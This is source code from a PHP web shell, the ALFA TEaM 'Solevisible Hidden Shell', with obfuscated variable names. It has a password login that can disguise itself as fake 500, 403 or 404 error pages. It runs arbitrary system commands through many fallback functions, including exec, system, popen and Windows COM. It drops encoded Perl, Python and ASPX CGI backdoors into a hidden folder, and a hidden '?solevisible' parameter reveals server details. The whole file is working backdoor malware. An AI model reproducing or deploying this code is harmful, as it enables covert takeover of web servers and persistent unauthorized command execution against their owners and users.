if($yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaLoginPage'] == 'gui'){
if(@$_COOKIE["AlfaUser"] != $yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaUser'] && $_COOKIE["AlfaPass"] != md5($yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaPass'])){
if(@$_POST["usrname"]==$yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaUser'] && @md5($_POST["password"])==$yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaPass']){
__alfa_set_cookie("AlfaUser", $yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaUser']);
__alfa_set_cookie("AlfaPass", @md5($yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaPass']));
@header('location: '.$_SERVER["PHP_SELF"]);
}
echo '
<style>
body{background: black;}
#loginbox { font-size:11px; color:green; right:85px; width:1200px; height:200px; border-radius:5px; -moz-boder-radius:5px; position:fixed; top:250px; }
#loginbox td { border-radius:5px; font-size:11px; }
</style>
<title>~ ALFA TEaM Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</title><center>
<center><img style="border-radius:100px;" width="500" height="250" alt="alfa team 2012" draggable="false" src="http://solevisible.com/images/alfa-iran.png" /></center>
<div id=loginbox><p><font face="verdana,arial" size=-1>
<center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
<tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ ALFA TEaM Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</b></font></th></tr>
<tr><td bgcolor="black" style="padding:5">
<form method="post">
<input type="hidden" name="action" value="login">
<input type="hidden" name="hide" value="">
<center><table>
<tr><td><font color="green" face="verdana,arial" size=-1>Login:</font></td><td><input type="text" size="30" name="usrname" placeholder="username" onfocus="if (this.value == \'username\'){this.value = \'\';}"></td></tr>
<tr><td><font color="green" face="verdana,arial" size=-1>Password:</font></td><td><input type="password" size="30" name="password" placeholder="password" onfocus="if (this.value == \'password\') this.value = \'\';"></td></tr>
<tr><td><font face="verdana,arial" size=-1>&nbsp;</font></td><td><font face="verdana,arial" size=-1><input type="submit" value="Login"></font></td></tr></table>
</div><br /></center>';
exit;
}
}elseif($yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaLoginPage']=='500'){
if(@$_COOKIE["AlfaPass"] != @md5($yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaPass'])){
if(@md5($_POST["password"])==$yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaPass']){
__alfa_set_cookie("AlfaUser", $yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaUser']);
__alfa_set_cookie("AlfaPass", @md5($yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaPass']));
@header('location: '.$_SERVER["PHP_SELF"]);
}
echo '<html><head><title>500 Internal Server Error</title></head><body><h1>Internal Server Error</h1><p>The server encountered an internal error or misconfiguration and was unable to complete your request.</p><p>Please contact the server administrator, '.$_SERVER['SERVER_ADMIN'].' and inform them of the time the error occurred, and anything you might have done that may have caused the error.</p><p>More information about this error may be available in the server error log.</p><hr>'.$vfxsqaznf6b7fa7a8e814d2fa0a23fcb00ef8500.'</body></html>'.$dbsnqidg72cd5e4a97936b8bb2fff3250aec052f;
exit;
}
}elseif($yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaLoginPage']=='403'){
if(@$_COOKIE["AlfaPass"] != @md5($yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaPass'])){
if(@md5($_POST["password"])==$yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaPass']){
__alfa_set_cookie("AlfaUser", $yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaUser']);
__alfa_set_cookie("AlfaPass", @md5($yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaPass']));
@header('location: '.$_SERVER["PHP_SELF"]);
}
echo "<html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You don't have permission to access ".$_SERVER['PHP_SELF']." on this server.</p><hr>".$vfxsqaznf6b7fa7a8e814d2fa0a23fcb00ef8500."</body></html>".$dbsnqidg72cd5e4a97936b8bb2fff3250aec052f;
exit;
}
}elseif($yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaLoginPage']=='404'){
if(@$_COOKIE["AlfaPass"] != @md5($yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaPass'])){
if(@md5($_POST["password"])==$yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaPass']){
__alfa_set_cookie("AlfaUser", $yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaUser']);
__alfa_set_cookie("AlfaPass", @md5($yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaPass']));
@header('location: '.$_SERVER["PHP_SELF"]);
}
echo "<title>404 Not Found</title><h1>Not Found</h1><p>The requested URL ".$_SERVER['PHP_SELF']." was not found on this server.<br><br>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p><hr>".$vfxsqaznf6b7fa7a8e814d2fa0a23fcb00ef8500."</body></html>".$dbsnqidg72cd5e4a97936b8bb2fff3250aec052f;
exit;
}
}
}
function decrypt_post($okjeiabf341be97d9aff90c9978347f66f945b77){
	if(__ALFA_POST_ENCRYPTION__){
		$mevhntrj9003d1df22eb4d3820015070385194c8 = __ALFA_SECRET_KEY__;
		$mevhntrj9003d1df22eb4d3820015070385194c8     = __ZW5jb2Rlcg($mevhntrj9003d1df22eb4d3820015070385194c8);
		$okjeiabf341be97d9aff90c9978347f66f945b77     = __ZGVjb2Rlcg($okjeiabf341be97d9aff90c9978347f66f945b77);
		$vqtsspcv5431c6e55ec7ee40de7e06ff11bf01d9 = "";
		$ynfybpyp8ce1d07d1bd95dafc59816063c461486 = "";
		$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741       = 0;
		while ($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 < strlen($okjeiabf341be97d9aff90c9978347f66f945b77)) {
			for ($zvhlbqna363b122c528f54df4a0446b6bab05515 = 0; $zvhlbqna363b122c528f54df4a0446b6bab05515 < strlen($mevhntrj9003d1df22eb4d3820015070385194c8); $zvhlbqna363b122c528f54df4a0446b6bab05515++) {
				$vqtsspcv5431c6e55ec7ee40de7e06ff11bf01d9 = chr(ord($okjeiabf341be97d9aff90c9978347f66f945b77[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]) ^ ord($mevhntrj9003d1df22eb4d3820015070385194c8[$zvhlbqna363b122c528f54df4a0446b6bab05515]));
				$ynfybpyp8ce1d07d1bd95dafc59816063c461486 .= $vqtsspcv5431c6e55ec7ee40de7e06ff11bf01d9;
				$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++;
				if ($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 >= strlen($okjeiabf341be97d9aff90c9978347f66f945b77))
					break;
			}
		}
		return __ZGVjb2Rlcg($ynfybpyp8ce1d07d1bd95dafc59816063c461486);
	}else{
		return __ZGVjb2Rlcg($okjeiabf341be97d9aff90c9978347f66f945b77);
	}
}

function _AlfaSecretKey(){
	$epwwthow5ebe2294ecd0e0f08eab7690d2a6ee69 = @$_COOKIE["AlfaSecretKey"];
	if(!isset($_COOKIE["AlfaSecretKey"])){
		$epwwthow5ebe2294ecd0e0f08eab7690d2a6ee69 = uniqid(mt_rand(), true);
		__alfa_set_cookie("AlfaSecretKey", $epwwthow5ebe2294ecd0e0f08eab7690d2a6ee69);
	}
	return $epwwthow5ebe2294ecd0e0f08eab7690d2a6ee69;
}
function alfa_getColor($nyvfphvm42aefbae01d2dfd981f7da7d823d689e){
	if(isset($GLOBALS["DB_NAME"]["color"][$nyvfphvm42aefbae01d2dfd981f7da7d823d689e])&&$GLOBALS["DB_NAME"]["color"][$nyvfphvm42aefbae01d2dfd981f7da7d823d689e]!=""){
		return $GLOBALS["DB_NAME"]["color"][$nyvfphvm42aefbae01d2dfd981f7da7d823d689e];
	}else{
		$nyvfphvm42aefbae01d2dfd981f7da7d823d689e = $GLOBALS["__ALFA_COLOR__"][$nyvfphvm42aefbae01d2dfd981f7da7d823d689e];
		if(is_array($nyvfphvm42aefbae01d2dfd981f7da7d823d689e)){
			return $nyvfphvm42aefbae01d2dfd981f7da7d823d689e["key_color"];
		}else{
			return $nyvfphvm42aefbae01d2dfd981f7da7d823d689e;
		}
	}
}
function alfaCssLoadColors(){
	$wksygdxzc7a628cba22e28eb17b5f5c6ae2a266a = "";
	foreach($GLOBALS['__ALFA_COLOR__'] as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d => $rkptsoeg2063c1608d6e0baf80249c42e2be5804){
		if(!is_array($rkptsoeg2063c1608d6e0baf80249c42e2be5804)){
			$rkptsoeg2063c1608d6e0baf80249c42e2be5804 = alfa_getColor($ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d);
			$wksygdxzc7a628cba22e28eb17b5f5c6ae2a266a .= ".{$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d}{color: {$rkptsoeg2063c1608d6e0baf80249c42e2be5804};}";
		}else{
			if(isset($rkptsoeg2063c1608d6e0baf80249c42e2be5804["multi_selector"])){
				foreach($rkptsoeg2063c1608d6e0baf80249c42e2be5804["multi_selector"] as $damiszkt8ce4b16b22b58894aa86c421e8759df3 => $hvlrcxnj9e3669d19b675bd57058fd4664205d2a){
					$jnvdsdtk70dda5dfb8053dc6d1c492574bce9bfd = alfa_getColor($ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d);
					$nndigmblc13367945d5d4c91047b3b50234aa7ab = str_replace("{color}", $jnvdsdtk70dda5dfb8053dc6d1c492574bce9bfd, $hvlrcxnj9e3669d19b675bd57058fd4664205d2a);
					$wksygdxzc7a628cba22e28eb17b5f5c6ae2a266a .=  $damiszkt8ce4b16b22b58894aa86c421e8759df3."{".$nndigmblc13367945d5d4c91047b3b50234aa7ab."}";
				}
			}
		}
	}
	return $wksygdxzc7a628cba22e28eb17b5f5c6ae2a266a;
}
if(isset($_POST['ajax'])){
function AlfaNum(){
$dnqkqniqa956af09162870af6ce4ebe0f12ccaf8 = func_get_args();
$niytpinla6c6dd28743c140aa4aa98c4669eea39 = array();
$tpwrlifnea170e2cafb1337755c8b3d5ae4437f4 = array();
for($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741=1;$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741<=10;$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++){
$niytpinla6c6dd28743c140aa4aa98c4669eea39[] = $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741;
}
foreach($dnqkqniqa956af09162870af6ce4ebe0f12ccaf8 as $mcpievhm61dd86c2dc75c3f569ec619bd283a33f){
$tpwrlifnea170e2cafb1337755c8b3d5ae4437f4[] = $mcpievhm61dd86c2dc75c3f569ec619bd283a33f;
}
echo '<script>';
foreach($niytpinla6c6dd28743c140aa4aa98c4669eea39 as $rpatbarj56aed7e7485ff03d5605b885b86e947e){
if(in_array($rpatbarj56aed7e7485ff03d5605b885b86e947e,$tpwrlifnea170e2cafb1337755c8b3d5ae4437f4))
continue;
echo 'alfa'.$rpatbarj56aed7e7485ff03d5605b885b86e947e."_=";
}
echo '""</script>';
}}
function _alfa_cgicmd($rifxvzwwdfff0a7fa1a55c8c1a4966c19f6da452,$phbpyamz7572559ca86e781ba8fe8073a0b725c6="perl",$tyuqpazr63073e99b74e1a59a64941ad669a0b98=false){
	if(!$GLOBALS["DB_NAME"]["cgi_api"]){
		return "";
	}
	if(isset($_COOKIE["alfacgiapi_mode"])){
		return "";
	}
	$quchsrnifc7db3c6a8b7147c6a62ec39e8e24132 = $rifxvzwwdfff0a7fa1a55c8c1a4966c19f6da452;
	$zbctgofs6fa888f32997904f3b5eab4ee64bddb3 = function_exists('curl_version');
	$pwutrugo50e0f68b64a9345c312075eedbd73abc = function_exists('fsockopen');
	if($zbctgofs6fa888f32997904f3b5eab4ee64bddb3||$pwutrugo50e0f68b64a9345c312075eedbd73abc){
		$yufcrtdf6890fdfd4fde05d91446eb8e745c2167 = false;
		if(isset($_COOKIE["alfacgiapi"])){
			if(!@file_exists("alfacgiapi/".$_COOKIE["alfacgiapi"].".alfa")){
				$yufcrtdf6890fdfd4fde05d91446eb8e745c2167 = true;
				$phbpyamz7572559ca86e781ba8fe8073a0b725c6 = $_COOKIE["alfacgiapi"];
			}
		}
		if(!isset($_COOKIE["alfacgiapi"])||$yufcrtdf6890fdfd4fde05d91446eb8e745c2167){
			@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
			$pxmkwegbf83a0aa1f9ca0f7dd5994445ba7d9e80 = 'jZFRT8IwFIXf/RXXOqWNsKoxPlAwRliERIbK9EUMGdsFGrYyt2Iky/ztdkMlJj74cpKee853k96Dfb7OUj6ViieYRgDQ6FdOtAr8iE99FcZS7a0zhEF/4DSb136GF+ciSaXSQDorpVHpht4k2ASN75ovdByN1VgRIWfUctynvPbg3D86I28ycLzesFsrAF+B3A1HHmF5vAFqyTpYS9wYffMjo1IxkaIf0pHX7buVYaRidYau57je5NZxb7xerWDiSipoQ5ZEUlN+xL/qs5UBBAvzAHoCtg3WgbFzM3u25Au0PyDj42MOfC7objfbkdpbUpmuwxkTZWhbO6S2zXjiB0tKAlKHBb5T65QxPkdRQv6RkioveQXYbSDjEwJyBjTEmVQY0p8pY7+TJVwU5bcalwRxSAqWby8RYrAKcTKtrvM1X2CwNAmbtJIUL4nINpnGmP4VrVDs+6otXhWK4hM=';
			$jbyuabyldfed5bc177b87ab317c584e06566adc6 = "bZDBS8MwGMXPy19R66EtzhRk7DA3L1rxItOt3gajTb6twTQJydexIf7vJqvMiR5CyHvv93jk8iLvnM1roXJzwEYrgvYwIQPRGm0xYluB9W1/UVBVLSHNCOwZGPQpUzlHvqPaDX1sWFcOxiOy0baNZgGkjwIkX6K21RZSUDthtZp9JIvi9a1YluvnonyaPyST5GW+LJPPjLCWezIU0C3grpIdpIkXE281wN7/MYPsbWOFwii+1wpB4TUeDEwQ9pg32MqVXalwYiI2ka8L84/5fjGtxyMOTHNIj3XZVTw1Fu5iMmCNkHztkAs1jE4P3aFfoh012oC6Sf/WtDzLftGUSe3CBw4suE4G/ryOWqh4eo4E8cT0a3uSOrTC/KjxND+O/QI=";
			$ozurlglxd574d4bb40c84861791a694a999cce69 = "rVRdj5pAFH2uv+I6DGa1Iaybpg9amrRboptYbV360JQGWRiFyPI5WreU/95hoCyjsfFh52nm3nM/zuTcK3XVBz9UH+zM6xDHi0AhgG6jkJKQKvQpJiOg5EBVjz4GZmiGqLPehQ71oxCcjW9tCLW+LO4Na2+n2VU/7wA7PwDhpf71m87sn3VjuviEoKsBKoEIfkKvBymhuzSs0V1QfrMQFrD8bt0by7v5xDqH5cjbxdzQ54Y10+cTYyrCXqXEdkGZwxEKTtLzjHVUIdJyiRO5hHF6poQlUEICw5OegsixA9gDBY+/qYZwPlTV1yoUsoy47ZfnB6RMkku0AGVD4RoUmzHJaVH9jcxYjMGNOLw8+zLNvmAIWTblQYEaDy9ApYHcsvnrC7JTj4RNRHk8jUFG16ObQjBXBZgVCea6I7T6pxOTnQPOvWLV4NY+v7pRSPiFQ6uw/3w3U5Gon/KzAwo3Zz47gRi27MszbnPsjAAegv9MbqIbfaH3RmR5WwZFLZ1EO3b0ROrjcfMslSPmPpmDCypz8Nnylfd8Dx8XxvRF+b0MhaS4nAbJbIdfMs9f0+qmIcADECemrpwcj0fMC8pyrz0Z29IYy7LWNnLZxtJAa9mqdiUcC+Hl3hoiYPPyYTZDoHDlZirgLaj1IOGsJmwKpMghjlLK3FukoZWwQcBEeG+iFRIHoxmElv65toDV7iQ7kj5p+IqPD3YeXfgDbEWTt29AUarU/WpdNxiPONuzqHKpv4tT8t50UId1FbBdwWsULb9aA/4C";
			$ihvkcopfd77a5a2787362bc36e209f998e621e11 = "jZNda9swFIavk18hNAoOAXdsozdLyrrUKYaRlriNN0IuFPvEFbUl70jOB2P97T1SPBo8ynZlS+d53/Ph49HZF3YnCmDfhCoaehnzyTvOIiXWJSwk7BIrLF1uRGmAs7PL/ogUcVVrtGwmKjC1yCieHIyFKkxhHT7E7jHRyqIuzb8111IUShsrs/+A41vPENTvGYtSFSyrcjZmc/jZgLHhVGO15HTHV59fkUfInv6G3K3H5CZokTHj6cfZdn2z+CC+z+of1b7cVNOdWLwf88Gvfq+3PlhYrlgurCDDtipqdgtIvqirr8LAxafEJw6ojgH59441tvQ97G14lUziOFKZzok7nsIbsK3O2ZOQlHeoMzCG1aRXsGPtOfC2dUifB22sNjqcINCXmulUqlzviLbYQBeayhLcUCnsZhTCHniXucKiqUBZ46DzjHE2dDPuYg8Gkkcoy2gPWWOdo9+RLjaHXCJk1JhQucD8trF1Y98orwtHiBrfYFONTzSqay/QePDVnjYTHAfYroD+k9dHT0qhpCK/15HKgwF1+hr2yU+jzntO+6iVgTBFaSHgS6NL2Eoj6Xd5FrVcjWqESz48phvy0bk/O+3vPi3uCw==";
			if($phbpyamz7572559ca86e781ba8fe8073a0b725c6=="perl")$kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb = $pxmkwegbf83a0aa1f9ca0f7dd5994445ba7d9e80;elseif($phbpyamz7572559ca86e781ba8fe8073a0b725c6=="py")$kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb = $jbyuabyldfed5bc177b87ab317c584e06566adc6;else $kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb = $ozurlglxd574d4bb40c84861791a694a999cce69;
			if($phbpyamz7572559ca86e781ba8fe8073a0b725c6 == "aspx"){
				alfaWriteTocgiapi("aspx.aspx",$ihvkcopfd77a5a2787362bc36e209f998e621e11);
			}else{
				alfaWriteTocgiapi($phbpyamz7572559ca86e781ba8fe8073a0b725c6.".alfa",$kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb);
			}
			alfacgihtaccess('cgi', "alfacgiapi/");
		}else{
			$phbpyamz7572559ca86e781ba8fe8073a0b725c6 = $_COOKIE["alfacgiapi"];
		}
		$cwdfoiuxe09312074a96ab380eed9cbeebb4d907 = ".alfa";
		if($phbpyamz7572559ca86e781ba8fe8073a0b725c6=="aspx"){
			$cwdfoiuxe09312074a96ab380eed9cbeebb4d907 = ".aspx";
		}
		$ddbbzkzn2c71580f439bd1485e5e5f6c1c27b713 = __ALFA_DATA_FOLDER__."/alfacgiapi/".$phbpyamz7572559ca86e781ba8fe8073a0b725c6.$cwdfoiuxe09312074a96ab380eed9cbeebb4d907;
		$rifxvzwwdfff0a7fa1a55c8c1a4966c19f6da452 = "check=W3NvbGV2aXNpYmxlfmFwaV0=&cmd=".__ZW5jb2Rlcg("cd ".$GLOBALS['cwd'].";".$rifxvzwwdfff0a7fa1a55c8c1a4966c19f6da452);
		if($zbctgofs6fa888f32997904f3b5eab4ee64bddb3){
			$nfjpllnt884d9804999fc47a3c2694e49ad2536a = ($_SERVER['SERVER_PORT'] == 443 ? "https://" : "http://").$_SERVER["SERVER_NAME"].dirname($_SERVER["REQUEST_URI"])."/".$ddbbzkzn2c71580f439bd1485e5e5f6c1c27b713;
			$viovyaoc42b90196b487c54069097a68fe98ab6f = new AlfaCURL();
			$sfmsaibm8d777f385d3dfec8815d20f7496026dc = $viovyaoc42b90196b487c54069097a68fe98ab6f->Send($nfjpllnt884d9804999fc47a3c2694e49ad2536a, "post", $rifxvzwwdfff0a7fa1a55c8c1a4966c19f6da452);
		}elseif($pwutrugo50e0f68b64a9345c312075eedbd73abc){
			$patmqezkcf1e8c14e54505f60aa10ceb8d5d8ab3 = $_SERVER["SERVER_NAME"];
			$wtsjcykq9305b73d359bd06734fee0b3638079e1 = dirname($_SERVER["REQUEST_URI"])."/".$ddbbzkzn2c71580f439bd1485e5e5f6c1c27b713;
			$sfmsaibm8d777f385d3dfec8815d20f7496026dc = _alfa_fsockopen($patmqezkcf1e8c14e54505f60aa10ceb8d5d8ab3,$wtsjcykq9305b73d359bd06734fee0b3638079e1,$rifxvzwwdfff0a7fa1a55c8c1a4966c19f6da452);
		}
		$vemvtkqkc68271a63ddbc431c307beb7d2918275 = "";
		if(strpos($sfmsaibm8d777f385d3dfec8815d20f7496026dc, "[solevisible~api]") !== false && strpos($sfmsaibm8d777f385d3dfec8815d20f7496026dc, '[solevisible~api]<pre>"+output+"</pre>') === false){
			if($tyuqpazr63073e99b74e1a59a64941ad669a0b98){
				__alfa_set_cookie("alfacgiapi", $phbpyamz7572559ca86e781ba8fe8073a0b725c6);
			}
			if(@preg_match("/<pre>(.*?)<\/pre>/s", $sfmsaibm8d777f385d3dfec8815d20f7496026dc, $ybaqpbzt9b207167e5381c47682c6b4f58a623fb)){
				$vemvtkqkc68271a63ddbc431c307beb7d2918275 = $ybaqpbzt9b207167e5381c47682c6b4f58a623fb[1];
			}
		}elseif($phbpyamz7572559ca86e781ba8fe8073a0b725c6=="perl"){
			return _alfa_cgicmd($quchsrnifc7db3c6a8b7147c6a62ec39e8e24132,"py",$tyuqpazr63073e99b74e1a59a64941ad669a0b98);
		}elseif($phbpyamz7572559ca86e781ba8fe8073a0b725c6=="py"){
			return _alfa_cgicmd($quchsrnifc7db3c6a8b7147c6a62ec39e8e24132,"bash",$tyuqpazr63073e99b74e1a59a64941ad669a0b98);
		}elseif($phbpyamz7572559ca86e781ba8fe8073a0b725c6=="bash" && $GLOBALS['sys']=="win"){
			return _alfa_cgicmd($quchsrnifc7db3c6a8b7147c6a62ec39e8e24132,"aspx",$tyuqpazr63073e99b74e1a59a64941ad669a0b98);
		}else{
			if($tyuqpazr63073e99b74e1a59a64941ad669a0b98){
				__alfa_set_cookie("alfacgiapi_mode", "off");
			}
		}
		return trim($vemvtkqkc68271a63ddbc431c307beb7d2918275);
	}else{
		return "";
	}
}
function alfaGetCwd(){
	if(function_exists("getcwd")){
		return @getcwd();
	}else{
		return dirname($_SERVER["SCRIPT_FILENAME"]);
	}
}
function alfaEx($ukaqpdqv13b5bfe96f3e2fe411c9f66f4a582adf,$gjtltovk12eccbdd9b32918131341f38907cbbb5=false,$aktuwcbj8ddeb2027a8c79b3c46510a6dcef9dda=true,$qcsrkruna181a603769c1f98ad927e7367c7aa51=false){
	$sfmsaibm8d777f385d3dfec8815d20f7496026dc = _alfa_php_cmd($ukaqpdqv13b5bfe96f3e2fe411c9f66f4a582adf,$gjtltovk12eccbdd9b32918131341f38907cbbb5);
	if(empty($sfmsaibm8d777f385d3dfec8815d20f7496026dc)&&$aktuwcbj8ddeb2027a8c79b3c46510a6dcef9dda||$qcsrkruna181a603769c1f98ad927e7367c7aa51){
		if($GLOBALS['sys']=='unix'){
			if(strlen(_alfa_php_cmd("whoami"))==0||$qcsrkruna181a603769c1f98ad927e7367c7aa51){
				$rifxvzwwdfff0a7fa1a55c8c1a4966c19f6da452 = _alfa_cgicmd($ukaqpdqv13b5bfe96f3e2fe411c9f66f4a582adf);
				if(!empty($rifxvzwwdfff0a7fa1a55c8c1a4966c19f6da452)){
					return $rifxvzwwdfff0a7fa1a55c8c1a4966c19f6da452;
				}
			}
		}
	}
	return $sfmsaibm8d777f385d3dfec8815d20f7496026dc;
}
function _alfa_php_cmd($ukaqpdqv13b5bfe96f3e2fe411c9f66f4a582adf,$gjtltovk12eccbdd9b32918131341f38907cbbb5=false){
$vemvtkqkc68271a63ddbc431c307beb7d2918275='';
try{
if($gjtltovk12eccbdd9b32918131341f38907cbbb5)$ukaqpdqv13b5bfe96f3e2fe411c9f66f4a582adf=$ukaqpdqv13b5bfe96f3e2fe411c9f66f4a582adf." 2>&1";
if(function_exists('exec')){
@exec($ukaqpdqv13b5bfe96f3e2fe411c9f66f4a582adf,$vemvtkqkc68271a63ddbc431c307beb7d2918275);
$vemvtkqkc68271a63ddbc431c307beb7d2918275 = @join("\n",$vemvtkqkc68271a63ddbc431c307beb7d2918275);
}elseif(function_exists('passthru')) {
ob_start();
@passthru($ukaqpdqv13b5bfe96f3e2fe411c9f66f4a582adf);
$vemvtkqkc68271a63ddbc431c307beb7d2918275 = ob_get_clean();
}elseif(function_exists('system')){
ob_start();
@system($ukaqpdqv13b5bfe96f3e2fe411c9f66f4a582adf);
$vemvtkqkc68271a63ddbc431c307beb7d2918275 = ob_get_clean();
} elseif (function_exists('shell_exec')) {
$vemvtkqkc68271a63ddbc431c307beb7d2918275 = shell_exec($ukaqpdqv13b5bfe96f3e2fe411c9f66f4a582adf);
}elseif(function_exists("popen")&&function_exists("pclose")){
if(is_resource($npviloqa8fa14cdd754f91cc6554c9e71929cce7 = @popen($ukaqpdqv13b5bfe96f3e2fe411c9f66f4a582adf,"r"))){
$vemvtkqkc68271a63ddbc431c307beb7d2918275 = "";
while(!@feof($npviloqa8fa14cdd754f91cc6554c9e71929cce7))
$vemvtkqkc68271a63ddbc431c307beb7d2918275 .= fread($npviloqa8fa14cdd754f91cc6554c9e71929cce7,1024);
pclose($npviloqa8fa14cdd754f91cc6554c9e71929cce7);
}
}elseif(function_exists('proc_open')){
$irepvwla24a9384d408f3fa1654c08dfaea45dd3 = array();
$kuiuelsn5075140835d0bc504791c76b04c33d2b = @proc_open($ukaqpdqv13b5bfe96f3e2fe411c9f66f4a582adf.' 2>&1', array(array("pipe","w"), array("pipe","w"), array("pipe","w")), $irepvwla24a9384d408f3fa1654c08dfaea45dd3, null);
$vemvtkqkc68271a63ddbc431c307beb7d2918275=@stream_get_contents($irepvwla24a9384d408f3fa1654c08dfaea45dd3[1]);
}elseif(class_exists('COM')){
$nghggwdtc567b60e5c351a8398d002e31a9408e4 = new COM('WScript.shell');
$tlbcubki52fb3679b07eb74d90784e612ca5cb30 = $nghggwdtc567b60e5c351a8398d002e31a9408e4->exec('cmd.exe /c '.$_POST['alfa1']);
$ffspzket64322f5f3ff7f9f717279e1b017a997e = $tlbcubki52fb3679b07eb74d90784e612ca5cb30->StdOut();
$vemvtkqkc68271a63ddbc431c307beb7d2918275=$ffspzket64322f5f3ff7f9f717279e1b017a997e->ReadAll();
}
}catch(Exception $qxcuilgde1671797c52e15f763380b45e841ec32){}
return $vemvtkqkc68271a63ddbc431c307beb7d2918275;
}
function _alfa_fsockopen($patmqezkcf1e8c14e54505f60aa10ceb8d5d8ab3,$wtsjcykq9305b73d359bd06734fee0b3638079e1,$viovyaoc42b90196b487c54069097a68fe98ab6f){
	$bbpyrbrt61f2529360aec54f5dc9804b842cf3fa = @fsockopen($patmqezkcf1e8c14e54505f60aa10ceb8d5d8ab3, 80, $irrxgcsz70106d0d821513f45702b7d25664ab7c, $ivgnqlyv809b1abe3f111fd3bb1a54c62706129f, 15);
	if($bbpyrbrt61f2529360aec54f5dc9804b842cf3fa){
		$pvoljqdc80791b3ae7002cb88c246876d9faa8f8  = "POST {$wtsjcykq9305b73d359bd06734fee0b3638079e1} HTTP/1.0\r\n";
		$pvoljqdc80791b3ae7002cb88c246876d9faa8f8 .= "Host: {$patmqezkcf1e8c14e54505f60aa10ceb8d5d8ab3}\r\n";
		$pvoljqdc80791b3ae7002cb88c246876d9faa8f8 .= "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
		$pvoljqdc80791b3ae7002cb88c246876d9faa8f8 .= "Content-Type: application/x-www-form-urlencoded\r\n";
		$pvoljqdc80791b3ae7002cb88c246876d9faa8f8 .= "Content-length: " . strlen($viovyaoc42b90196b487c54069097a68fe98ab6f) . "\r\n";
		$pvoljqdc80791b3ae7002cb88c246876d9faa8f8 .= "Connection: close\r\n\r\n";
		$pvoljqdc80791b3ae7002cb88c246876d9faa8f8 .= $viovyaoc42b90196b487c54069097a68fe98ab6f . "\r\n\r\n";
		fwrite($bbpyrbrt61f2529360aec54f5dc9804b842cf3fa, $pvoljqdc80791b3ae7002cb88c246876d9faa8f8);
		$dlivxtrp98bf7d8c15784f0a3d63204441e1e2aa = "";
		while (!@feof($bbpyrbrt61f2529360aec54f5dc9804b842cf3fa)) {
			$dlivxtrp98bf7d8c15784f0a3d63204441e1e2aa .= @fgets($bbpyrbrt61f2529360aec54f5dc9804b842cf3fa, 4096);
		}
		list($fpzdcspv099fb995346f31c749f6e40db0f395e3, $bultgmdu841a2d689ad86bd1611447453c22c6fc) = explode("\r\n\r\n", $dlivxtrp98bf7d8c15784f0a3d63204441e1e2aa, 2);
		@fclose($bbpyrbrt61f2529360aec54f5dc9804b842cf3fa);
		return $bultgmdu841a2d689ad86bd1611447453c22c6fc;
	}else{
		return "";
	}
}
if(isset($_GET["solevisible"])){
@error_reporting(E_ALL ^ E_NOTICE);
echo '<html>';
echo "<title>Solevisible Hidden Shell</title>";
echo "<body bgcolor=#000000>";
echo '<b><big><font color=#7CFC00>Kernel : </font><font color="#FFFFF">'.(function_exists('php_uname')?php_uname():'???').'</font></b></big>';
$advbtcgoee5bd868ca96203f40dcfbcf40ea2a06 = @ini_get('safe_mode');
if($advbtcgoee5bd868ca96203f40dcfbcf40ea2a06){$yxarqqmp4b43b0aee35624cd95b910189b3dc231 = "<b style='color: red'>On</b>";}else{$yxarqqmp4b43b0aee35624cd95b910189b3dc231 = "<b style='color: green'>Off</b>";}
echo "<br><b style='color: #7CFC00'>OS: </font><font color=white>" . PHP_OS . "</font><br>";
echo "<b style='color: #7CFC00'>Software: </font><font color=white>" . $_SERVER ['SERVER_SOFTWARE'] . "</font><br>";
echo "PHP Version: <font color=white>" . PHP_VERSION .  "</font><br />";
